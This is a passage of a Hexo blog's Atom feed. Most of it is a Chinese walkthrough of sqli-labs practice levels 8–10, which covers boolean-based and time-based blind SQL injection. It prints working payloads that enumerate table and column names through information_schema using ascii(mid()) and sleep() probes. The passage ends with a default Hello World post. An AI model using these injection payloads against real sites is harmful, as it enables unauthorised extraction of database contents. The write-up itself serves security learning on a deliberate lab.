src="/2018/07/06/sql-labs/sql-08/2018-07-06-16-41-44.png" alt=""></p><!-- 猜测第一张表名的长度为6![](sql-labs/sql-08/2018-07-06-16-50-04.png)![](sql-labs/sql-08/2018-07-06-16-50-29.png) --><pre><code>用二分法爆表名</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1<span class="string">' and length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;5 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and length((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1))&gt;6 %23 </span><br><span class="line">返回异常页面，第一张表名的长度为6</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;100 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))&gt;101 %23 </span><br><span class="line">返回异常页面，第一位是 e</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1))&gt;108 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),2,1))&gt;108 %23 </span><br><span class="line">返回异常页面，第二位是 m</span><br><span class="line"></span><br><span class="line">剩余4位同上。</span><br></pre></td></tr></table></figure><pre><code>爆users表字段</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">?id=1<span class="string">' and length((select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 1,1))&gt;7 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and length((select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span> <span class="built_in">limit</span> 1,1))&gt;8 %23 </span><br><span class="line">返回异常页面，users表第二个字段名长度为8</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and ascii(mid((select column_name from information_schema.columns where table_name='</span>users<span class="string">' limit 1,1),1,1))&gt;116 %23 </span></span><br><span class="line"><span class="string">返回正常页面</span></span><br><span class="line"><span class="string">?id=1'</span> and ascii(mid((select column_name from information_schema.columns <span class="built_in">where</span> table_name=<span class="string">'users'</span> <span class="built_in">limit</span> 1,1),1,1))&gt;117 %23 </span><br><span class="line">返回异常页面，第一位是 u</span><br><span class="line">剩余位数同上。</span><br><span class="line">之后就可以爆数据了。原理同上。</span><br></pre></td></tr></table></figure><h3 id="Less-9-GET-Blind-Time-based-Single-quotes"><a href="#Less-9-GET-Blind-Time-based-Single-quotes" class="headerlink" title="Less-9 GET-Blind-Time based-Single quotes"></a>Less-9 GET-Blind-Time based-Single quotes</h3><pre><code>这题是时间盲注，无论输入什么参数页面都不会变化。</code></pre><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">爆第一张表</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))&gt;6,1,sleep(4)) %23</span></span><br><span class="line"><span class="string">页面延迟较长时间返回</span></span><br><span class="line"><span class="string">?id=1'</span> and <span class="keyword">if</span>(length((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1))&gt;5,1,sleep(4)) %23</span><br><span class="line">页面在正常时间内返回，判断表名长度为6</span><br><span class="line"></span><br><span class="line">?id=1<span class="string">' and if(ascii(mid((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;101,1,sleep(4)) %23</span></span><br><span class="line"><span class="string">页面延迟返回</span></span><br><span class="line"><span class="string">?id=1'</span> and <span class="keyword">if</span>(ascii(mid((select table_name from information_schema.tables <span class="built_in">where</span> table_schema=database() <span class="built_in">limit</span> 0,1),1,1))&gt;100,1,sleep(4)) %23</span><br><span class="line">页面正常返回，第一位的ascii码为101，也就是 e</span><br><span class="line"></span><br><span class="line">剩余位数同上。</span><br></pre></td></tr></table></figure><h3 id="Less-10-GET-Blind-Time-based-Double-quotes"><a href="#Less-10-GET-Blind-Time-based-Double-quotes" class="headerlink" title="Less-10 GET-Blind-Time based-Double quotes"></a>Less-10 GET-Blind-Time based-Double quotes</h3><pre><code>和上一题的步骤一样，但是要把单引号替换为双引号。</code></pre><h2 id="11-20-解题思路"><a href="#11-20-解题思路" class="headerlink" title="11-20/解题思路"></a>11-20/解题思路</h2><p>###11关</p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;1-10-解题思路&quot;&gt;&lt;a href=&quot;#1-10-解题思路&quot; class=&quot;headerlink&quot; title=&quot;1-10/解题思路&quot;&gt;&lt;/a&gt;1-10/解题思路&lt;/h2&gt;&lt;h3 id=&quot;Less-1-GET-Error-based-Single-quotes-String&quot;&gt;&lt;a href=&quot;#Less-1-GET-Error-based-Single-quotes-String&quot; class=&quot;headerlink&quot; title=&quot;Less-1 GET-Error based-Single quotes-String&quot;&gt;&lt;/a&gt;Less-1 GET-Error based-Single quotes-String&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;首先是正常的查询界面
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;img src=&quot;/2018/07/06/sql-labs/sql-01/2018-07-06-09-32-16.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;!-- 发现返回不同用户信息，可以判断为字符型注入
![](sql-labs/sql-01/2018-07-06-10-54-07.png) --&gt;
    
    </summary>
    
      <category term="Web-Security" scheme="http://www.mr-guo.xin/categories/Web-Security/"/>
    
      <category term="sqli-labs" scheme="http://www.mr-guo.xin/categories/Web-Security/sqli-labs/"/>
    
    
      <category term="mysql" scheme="http://www.mr-guo.xin/tags/mysql/"/>
    
  </entry>
  
  <entry>
    <title>Hello World</title>
    <link href="http://www.mr-guo.xin/2018/03/15/hello-world/"/>
    <id>http://www.mr-guo.xin/2018/03/15/hello-world/</id>
    <published>2018-03-15T12:24:23.014Z</published>
    <updated>2018-07-06T02:23:45.100Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><a id="more"></a><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.io/docs/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;documentation&lt;/a&gt; for more info. If you get any problems when using Hexo, you can find the answer in &lt;a href=&quot;https://hexo.io/docs/troubleshooting.html&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;troubleshooting&lt;/a&gt; or you can ask me on &lt;a href=&quot;https://github.com/hexojs/hexo/issues&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&quot;Quick-Start&quot;&gt;&lt;a href=&quot;#Quick-Start&quot; class=&quot;headerlink&quot; title=&quot;Quick Start&quot;&gt;&lt;/a&gt;Quick Start&lt;/h2&gt;&lt;h3 id=&quot;Create-a-new-post&quot;&gt;&lt;a href=&quot;#Create-a-new-post&quot; class=&quot;headerlink&quot; title=&quot;Create a new post&quot;&gt;&lt;/a&gt;Create a new post&lt;/h3&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;$ hexo new &lt;span class=&quot;string&quot;&gt;&quot;My New Post&quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
  </entry>
  
</feed>
